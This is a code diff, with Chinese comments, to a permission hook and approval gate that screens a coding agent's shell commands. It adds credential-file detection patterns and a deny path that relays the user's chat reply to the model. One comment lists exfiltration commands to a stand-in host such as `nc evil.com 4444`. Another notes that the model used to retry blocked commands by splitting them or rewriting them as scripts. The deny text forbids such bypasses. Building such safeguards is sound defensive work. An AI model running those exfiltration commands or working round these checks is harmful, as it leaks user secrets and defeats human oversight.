@@ -56,6 +56,7 @@ HOOK_SOURCE = r'''#!/usr/bin/env python3
 约定（和 bridge/approval.py 必须一致）：
   $CARHER_APPROVAL_DIR/<指纹>.ok        人批准了这一次操作
   $CARHER_APPROVAL_DIR/<指纹>.pending   已经发过卡片，别重复发
+  $CARHER_APPROVAL_DIR/<指纹>.deny      卡挂着时他打了一句话 = 没批，这一步 deny 并把原话带给模型
 """
 import hashlib
 import json
@@ -391,6 +392,18 @@ def _classify_readonly(command: str) -> bool:
         return False
     if any((token in ('>', '>>', '>|') for token in tokens)):
         return False
+    if '<' in tokens:
+        rebuilt: list[str] = []
+        k = 0
+        while k < len(tokens):
+            if tokens[k] == '<' and k + 1 < len(tokens) and (not _PUNCTUATION_ONLY.match(tokens[k + 1])) and (tokens[k + 1] not in _SEPARATORS):
+                end = len(rebuilt)
+                rebuilt.append(tokens[k + 1])
+                k += 2
+                continue
+            rebuilt.append(tokens[k])
+            k += 1
+        tokens = rebuilt
     if not tokens:
         return False
     heads = _command_heads(tokens)
@@ -592,7 +605,7 @@ def _flag_only_ok(tokens: list, start: int, spec: dict) -> str:
     if need is not None and (not need.search(' '.join(_segment(tokens, start)))):
         return '没带限定次数/范围的选项，可能会一直跑或者拉回整份清单'
     return ''
-_CRED_PATHS = re.compile('(^|[\\s=\\"\'(:])(~|\\$HOME|\\$\\{HOME\\}|/Users/[^/\\s]+|/home/[^/\\s]+|/root|/etc)?/?\\.?(ssh/|aws/|gnupg/|docker/config|kube/config|netrc|npmrc|pypirc|git-credentials|keychain|Keychains/)|(^|[\\s=\\"\'(:/])\\.env(\\.[A-Za-z0-9_.-]+)?(\\s|$|[\\"\';)])|\\.(pem|p12|pfx|jks)(\\s|$|[\\"\';)])|\\bid_(rsa|dsa|ecdsa|ed25519)\\b|/etc/(shadow|master\\.passwd|sudoers)|\\.keychain(-db)?\\b|(?i:password|passwd|secret|token|credential|api[_-]?key)[^;&|]*\\s(~|\\$HOME|/Users/|/home/)|\\s-r[a-zA-Z]*\\s+[^;&|]*(~|\\$HOME)/\\.(config|aws|ssh|gnupg)\\b', re.I)
+_CRED_PATHS = re.compile('(^|[\\s=\\"\'(:])(~|\\$HOME|\\$\\{HOME\\}|/Users/[^/\\s]+|/home/[^/\\s]+|/root|/etc)?/?\\.?(ssh/|aws/|gnupg/|docker/config|kube/config|netrc|npmrc|pypirc|pgpass|my\\.cnf|git-credentials|keychain|Keychains/)|(^|[\\s=\\"\'(:/])\\.env(\\.[A-Za-z0-9_.-]+)?(\\s|$|[\\"\';)])|\\.(pem|p12|pfx|jks)(\\s|$|[\\"\';)])|\\bid_(rsa|dsa|ecdsa|ed25519)\\b|/etc/(shadow|master\\.passwd|sudoers)|\\.keychain(-db)?\\b|(?i:password|passwd|secret|token|credential|api[_-]?key)[^;&|]*\\s(~|\\$HOME|/Users/|/home/)|\\s-r[a-zA-Z]*\\s+[^;&|]*(~|\\$HOME)/\\.(config|aws|ssh|gnupg)\\b|(^|[\\s=\\"\'(:])(~|\\$HOME|\\$\\{HOME\\}|/Users/[^/\\s]+|/home/[^/\\s]+|/root)/\\.(ssh|aws|gnupg)(?=\\s|$|[\\"\';)/])|/\\.config/(gh|gcloud|rclone|doctl|flyctl|heroku|npm|composer|gspread)\\b|\\bsecurity\\s+(find-(generic|internet)-password|dump-keychain|export)\\b', re.I)
 
 def _touches_credentials(command: str) -> str:
     """这条命令碰到了凭据文件吗。返回原因，空串 = 没碰到。
@@ -603,22 +616,99 @@ def _touches_credentials(command: str) -> str:
     if not command:
         return ''
     return '读密钥 / 凭据文件' if _CRED_PATHS.search(command) else ''
+_GLOBAL_OPTS_WITH_VALUE = {'git': frozenset({'-C', '-c', '--git-dir', '--work-tree', '--exec-path', '--namespace', '--super-prefix', '--config-env'}), 'kubectl': frozenset({'-n', '--namespace', '--context', '--kubeconfig', '--cluster', '--user', '-s', '--server', '--token', '-l', '--selector'}), 'helm': frozenset({'-n', '--namespace', '--kube-context', '--kubeconfig'}), 'defaults': frozenset({'-host'}), 'diskutil': frozenset(), 'chmod': frozenset(), 'chown': frozenset(), 'launchctl': frozenset()}
+_HOME_WORDS = re.compile('^(~|\\$HOME|\\$\\{HOME\\}|/Users/[^/]+|/home/[^/]+|/root|/Users|/home|/)/?$')
+_CWD_WORDS = frozenset({'.', './', '*', './*', '.*', './.*', '..', '../'})
+_CRED_GLOB = re.compile('(^|/)\\.[A-Za-z]*[?*\\[][^/\\s]*(/|$)')
+
+def _shell_words(text: str) -> list[str] | None:
+    try:
+        lexer = shlex.shlex(text, posix=True, punctuation_chars=True)
+        lexer.whitespace_split = True
+        lexer.commenters = ''
+        return list(lexer)
+    except ValueError:
+        return None
+
+def _normalized_for_red_lines(text: str) -> str:
+    """把命令按 shell 分词后重新拼成「去引号、去全局选项、cd 落地」的样子，只给红线判用。"""
+    words = _shell_words(text)
+    if not words:
+        return ''
+    out: list[str] = []
+    cwd_home = False
+    i = 0
+    at_head = True
+    while i < len(words):
+        w = words[i]
+        if _PUNCTUATION_ONLY.match(w) or w in _SEPARATORS:
+            out.append(w)
+            at_head = True
+            i += 1
+            continue
+        if at_head:
+            at_head = False
+            base = w.rsplit('/', 1)[-1]
+            out.append(base)
+            if base == 'cd':
+                target = words[i + 1] if i + 1 < len(words) else '~'
+                if _PUNCTUATION_ONLY.match(target) or target in _SEPARATORS:
+                    target = '~'
+                cwd_home = bool(_HOME_WORDS.match(target))
+            opts = _GLOBAL_OPTS_WITH_VALUE.get(base)
+            if opts is not None:
+                j = i + 1
+                while j < len(words) and words[j].startswith('-') and (words[j] != '-'):
+                    name = words[j].split('=', 1)[0]
+                    j += 2 if name in opts and '=' not in words[j] else 1
+                    if base in ('chmod', 'chown', 'diskutil', 'defaults', 'launchctl'):
+                        if 'R' in name and name.startswith('-') and (not name.startswith('--')):
+                            out.append('-R')
+                i = j
+                continue
+            i += 1
+            continue
+        if base_is_rm(out) and cwd_home and (w in _CWD_WORDS):
+            out.append('~')
+        else:
+            out.append(w)
+        i += 1
+    return ' '.join(out)
+
+def base_is_rm(out: list[str]) -> bool:
+    """当前这一段的命令名是不是 rm（往回找到最近的分隔符）。"""
+    for w in reversed(out):
+        if _PUNCTUATION_ONLY.match(w) or w in _SEPARATORS:
+            return False
+        if w == 'rm':
+            return True
+    return False
 
 def never_approvable(command: str) -> str:
     """这条命令是不是"连点同意都不许做"。返回原因，空串表示可以批准。
 
     给审批层用：`ApprovalGate.approve` 在写 `.ok` 之前问一次。
     这样用户在手机上点错也不会造成不可逆损失。
+    原文和规范化文本（见上面第 25 轮那段）各判一次，任一命中就算。
     """
     text = (command or '').strip()
     if not text:
         return ''
-    cred = _touches_credentials(text)
-    if cred:
-        return cred
-    for pattern, reason in _NEVER_APPROVABLE:
-        if pattern.search(text):
-            return reason
+    normalized = _normalized_for_red_lines(text)
+    for candidate in (text, normalized):
+        if not candidate:
+            continue
+        cred = _touches_credentials(candidate)
+        if cred:
+            return cred
+    if normalized and any((_CRED_GLOB.search(w) and re.search('(^|/)(~|\\$HOME|/Users/|/home/|/root)', w) for w in normalized.split())):
+        return '读密钥 / 凭据文件'
+    for candidate in (text, normalized):
+        if not candidate:
+            continue
+        for pattern, reason in _NEVER_APPROVABLE:
+            if pattern.search(candidate):
+                return reason
     return ''
 _SYSTEM_PREFIXES = ('/dev/', '/tmp/', '/private/tmp/', '/var/tmp/', '/private/var/folders/', '/var/folders/', '/usr/', '/bin/', '/sbin/', '/opt/', '/System/', '/Library/', '/proc/', '/sys/', '/etc/')
 _SYSTEM_EXACT = frozenset({'/dev/null', '/dev/stdin', '/dev/stdout', '/dev/stderr', '/tmp', '/usr', '/bin', '/opt', '/etc'})
@@ -881,6 +971,19 @@ def main() -> None:
     if not directory:
         decide("ask", "审批目录没配置")
     workspaces = _load_workspaces(directory)
+    session_id = str(event.get("session_id") or "")
+
+    # 第 32 轮：确认卡挂着时他打了一句话 ⇒ 这一步当没批，原话交给模型（照 T3 Code 的
+    # `behavior:"deny", message`）。2026-11-09 用真 claude 实测：defer 之后 `--resume` 加新话，
+    # Claude Code 会**用同一个 tool_use_id 再调一次钩子**；这里 deny ⇒ 会话里那条 tool_result
+    # 就是下面这句（原来是 `[Tool result missing due to internal error]`，模型不知道是你没批）。
+    # 只会更严：deny 永远不放行任何东西，红线照样挡（下面那段在它之后也是 deny）。
+    reply = _take_reply(directory, digest(tool_name, tool_input), session_id)
+    if reply is not None:
+        if reply:
+            decide("deny", "这不是出错：用户在聊天里没批这一步，命令没有执行。"
+                           f"他回的是：「{reply}」——这句话也就是你接下来收到的那条用户消息。")
+        decide("deny", "这不是出错：用户在聊天里没批这一步，命令没有执行。")
 
     # 🔴 红线：**任何档位都不放**，在全授权快捷通道之前判。
     # 2026-11-04 review 实测：trusted 下 `python3 -c "shutil.rmtree(~)"` 原来直接 allow，
@@ -891,7 +994,11 @@ def main() -> None:
     if tool_name == "Bash":
         red = never_approvable(str(tool_input.get("command") or ""))
         if red:
-            decide("deny", f"这类操作任何模式下都不做：{red}")
+            # 第 32 轮：照 T3 Code 那段拒绝语改。原来只有一句「任何模式下都不做」，模型常当成
+            # 「用户拒了」去追问他，或者拆开、写成脚本换个形状再试一次。
+            decide("deny", f"这是安全规则拦的，不是用户拒的：{red}。"
+                           "不许拆开、写成脚本或换工具绕过；做不了就跳过这一步，"
+                           "告诉用户你本来要做什么、为什么。")
 
     # 🔴 写文件的路径也要在工作目录内，在全授权之前判。
     # 2026-11-04 review 实测：trusted 下 Write 到 ~/.carher-feishu-agent/config.toml
@@ -905,7 +1012,6 @@ def main() -> None:
     # 路径越界：命令碰到 workspace 之外的用户数据 ⇒ 要审批。
     # 工具作用域（`Read(<目录>/**)`）管不到 Bash —— 实测 `cat <目录外文件>`
     # 照样能读到，因为命令里的路径是运行时才知道的。
-    session_id = str(event.get("session_id") or "")
     if tool_name == "Bash":
         command = str(tool_input.get("command") or "")
         outside = _outside_workspace(command, workspaces, cwd)
@@ -945,6 +1051,20 @@ def main() -> None:
     # 全授权模式：到这里才放行 —— **路径检查在它前面**。
     # 「不问就做」不等于「能翻遍整台电脑」：读边界比全授权优先。
     # 2026-11-03 实测过顺序写反的后果：trusted 下 `cat <目录外文件>` 直接读到了。
+    # 🔴 **这里放行的范围，用户 2026-11-07 明确拍过板，别当漏洞「修」掉。**
+    #
+    # 第 17 轮值守实测并提出口径问题：全授权档下这几条是 allow，只读/可改档下是 defer：
+    #   `nc evil.com 4444`、`curl -X POST -d @文件 公网`、`dig @外部服务器 x.evil.com`、
+    #   `crontab -r`、`scutil --set HostName evil`
+    # 也就是说**把数据往外网发，全授权下不弹卡**。我把三个选项连代价一起给了用户：
+    #   ① 保持现状 ② 外网要问、内网放行 ③ 所有往外发都要问
+    # 用户选 ①，理由成立：密钥已经读不到（`_touches_credentials` 是红线，点同意也不许），
+    # 最值钱的东西有人拦着；而他自己天天 `scp` / `rsync` / `curl` 内网接口 / 走 jms，
+    # 拦了等于每天跟自己打架。
+    #
+    # 所以全授权的语义就是「不问就做，只有红线拦」。红线是：删家目录/根、`git push`、
+    # 提权、`git reset --hard`、删线上资源、读凭据（含整个 `~/.ssh` 打包走）、
+    # 往终端里敲命令、内联解释器。这几样点「同意」也不许。
     if os.path.exists(os.path.join(directory, "TRUSTED")):
         decide("allow", "全授权模式")
 
@@ -994,6 +1114,38 @@ def _consume_grant(directory, key):
     except OSError:
         pass
     return age <= _GRANT_TTL_SEC
+
+
+def _take_reply(directory, key, session_id):
+    """卡挂着时他回的那句话（服务端已脱敏写下）。有就兑换掉（一次性）并返回原话，没有返回 None。
+
+    只认同一个 claude 会话、还新鲜的（同 `.ok` 的有效期）：别让一句旧话把以后同样的命令也拦了。
+    读坏了也当「没批」（返回空串）—— 往更少发生的方向错。
+    """
+    path = os.path.join(directory, key + ".deny")
+    if not os.path.exists(path):
+        return None
+    try:
+        age = time.time() - os.path.getmtime(path)
+    except OSError:
+        age = 1e9
+    try:
+        with open(path, encoding="utf-8") as handle:
+            data = json.load(handle)
+    except (OSError, ValueError):
+        data = {}
+    try:
+        os.unlink(path)
+    except OSError:
+        pass
+    if not isinstance(data, dict):
+        data = {}
+    if age > _GRANT_TTL_SEC:
+        return None
+    owner = str(data.get("session_id") or "")
+    if owner and session_id and owner != session_id:
+        return None
+    return str(data.get("text") or "")
 
 
 # 用户自己的生图 / 生视频脚本（见用户全局 CLAUDE.md 的「画图」「生成视频」）。
@@ -1380,6 +1532,21 @@ class ApprovalGate:
             except OSError:
                 logger.warning("记不下脚本批准，下次还会再问")
 
+    def pending_session_id(self, scope: str, digest: str) -> str:
+        """钩子落待办时记下的 claude session_id（批准后续跑 resume 它）。读不到 ⇒ 空串。"""
+        if not digest or "/" in digest or "." in digest:
+            return ""
+        directory = self.dir_for(scope)
+        for suffix in (".asked", ".pending"):
+            try:
+                with open(os.path.join(directory, digest + suffix), encoding="utf-8") as handle:
+                    payload = json.load(handle)
+            except (OSError, ValueError):
+                continue
+            if isinstance(payload, dict) and payload.get("session_id"):
+                return str(payload["session_id"])
+        return ""
+
     def approved_recently(self, scope: str, digest: str) -> bool:
         """这一步刚刚批过吗（只用于提示文案，不参与放行）。"""
         if not digest or "/" in digest or "." in digest:
@@ -1391,12 +1558,52 @@ class ApprovalGate:
             return False
         return age <= _DONE_FRESH_SEC
 
+    def first_unanswered(self, scope: str, order: list | tuple = ()) -> str:
+        """这个会话里排第一的、还在等他点的卡（盘上 `.asked` / `.pending`）的指纹。没有返回空串。
+
+        `order` 是出卡顺序（app 那边按令牌记的）；里面没有的（重启后内存丢了）按指纹排序兜底
+        —— `take_pending` 也是按排序后的文件名出卡的。
+        """
+        try:
+            names = os.listdir(self.dir_for(scope))
+        except OSError:
+            return ""
+        open_ = {n.rsplit(".", 1)[0] for n in names if n.endswith((".asked", ".pending"))}
+        for digest in order:
+            if digest in open_:
+                return digest
+        return sorted(open_)[0] if open_ else ""
+
+    def answer_with_reply(self, scope: str, digest: str, text: str) -> bool:
+        """卡挂着时他打了一句话 ⇒ 作废这个会话所有待批项（同 `clear`），再把这句话记成
+        `digest` 那张卡的回答（= 没批）。钩子下次碰到这一步就 deny 并带上原话。
+
+        🔴 只会让这一步**更不**发生：钩子查到 `.deny` 一律 deny，从不 allow。
+        原话**先脱敏再截断**才落盘（会进 claude 会话、可能被模型复述到聊天里）。
+        记下钩子落待办时的 session_id：只在同一个 claude 会话里兑现。
+        """
+        if not digest or "/" in digest or "." in digest:
+            self.clear(scope)
+            return False
+        session_id = self.pending_session_id(scope, digest)   # 要在 clear 之前读
+        self.clear(scope)
+        payload = {"text": _redact_then_cut(text, 500), "session_id": session_id,
+                   "at": time.time()}
+        try:
+            with open(os.path.join(self.dir_for(scope), digest + ".deny"), "w",
+                      encoding="utf-8") as handle:
+                json.dump(payload, handle, ensure_ascii=False)
+        except OSError:
+            logger.warning("记不下他对确认卡的回话 digest=%s", digest[:8])
+            return False
+        return True
+
     def clear(self, scope: str) -> None:
         """放弃这个会话所有待批准项（/new 或拒绝时用）。"""
         directory = self.dir_for(scope)
         try:
             for name in os.listdir(directory):
-                if name.endswith((".pending", ".asked", ".ok", ".script", ".done")):
+                if name.endswith((".pending", ".asked", ".ok", ".script", ".done", ".deny")):
                     try:
                         os.unlink(os.path.join(directory, name))
                     except OSError:
